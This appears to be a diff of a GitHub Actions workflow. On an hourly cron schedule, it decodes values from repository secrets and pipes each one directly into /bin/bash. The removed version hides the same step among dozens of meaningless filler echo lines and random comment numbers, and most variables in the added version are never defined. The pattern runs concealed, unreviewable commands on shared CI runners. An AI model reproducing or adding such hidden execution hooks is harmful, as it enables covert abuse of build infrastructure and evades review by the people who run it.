@@ -1,46 +1,22 @@
-name: wutingfang2345 #10139
-on: #3516
-  workflow_dispatch: #20151
-  schedule: #21188
-    - cron: '19 0/6 * * *' #8698
-jobs:  # 17691
-  build: #8993
-    runs-on: ubuntu-latest #2666
-    steps: #23353
-      - uses: actions/checkout@v4 #22477
-      - name: wutingfang2345 #21700
-        env: #452
-          t5409: ${{ secrets.t5409 }} #6150
+name: wutingfang2345
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wutingfang2345
+        env:
+          edf5: ${{ secrets.edf5 }}
         run: |
-          echo $t5409 | jq -r .n16601 | /bin/bash #17441
-          echo "Process check: $(ps -ef | wc -l 2>/dev/null || echo 0)"
-          echo "Command fail safe: false || echo 'Safe'"
-          echo "Temp file mock: tmp=\$(mktemp) && echo \$tmp || echo no-tmp"
-          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
-          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
-          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
-          echo "Var default: echo \${VAR:-default}"
-          echo "Sed mock: echo 'text' | sed 's/t/T/' 2>/dev/null || echo no-sed"
-          echo "Exit mock: exit 0 2>/dev/null || true"
-          echo "Signal mock: trap '' SIGINT"
-          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
-          echo "Time diff mock: echo \$SECONDS"
-          echo "Var op: v=1; echo \$((v+1))"
-          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
-          echo "History mock: history | head -1 2>/dev/null || echo no-history"
-          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
-          echo "Random check: [ $((RANDOM % 2)) -eq 0 ] && echo Even || echo Odd"
-          echo "Test file type: [ -f /etc/passwd ] && echo File"
-          echo "Random float-like: $((RANDOM % 100)).$((RANDOM % 100))"
-          echo "Grep mock: grep 'a' <<< 'abc' 2>/dev/null || echo no-grep"
-          echo "Complex pipe: echo test | tr a-z A-Z | cut -c1-3"
-          if [ -x /bin/ls ]; then echo "LS executable"; fi
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
-          echo "Command group: { echo group; }"
-          for i in 1 2 3; do echo "Loop $i"; done
-          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
-          echo "Eval mock: eval 'echo eval-test'"
-          echo "Git mock: git --version 2>/dev/null | head -1 || echo no-git"
-          for i in {1..3}; do echo "Iter $i"; done
-          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
-          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo $edf5 | jq -r .n92571 | /bin/bash
+          echo $fltjs44899 | jq -r .ppqgk90713 | /bin/bash
+          echo $sfj7 | jq -r .ixq554 | /bin/bash
+          echo $dw87389 | jq -r .hurnw3403 | /bin/bash
+          echo $orr85493 | jq -r .sxcq15 | /bin/bash
+          echo $b0 | jq -r .qlqpo704 | /bin/bash
+          echo $hloq92801 | jq -r .mlia99647 | /bin/bash
+
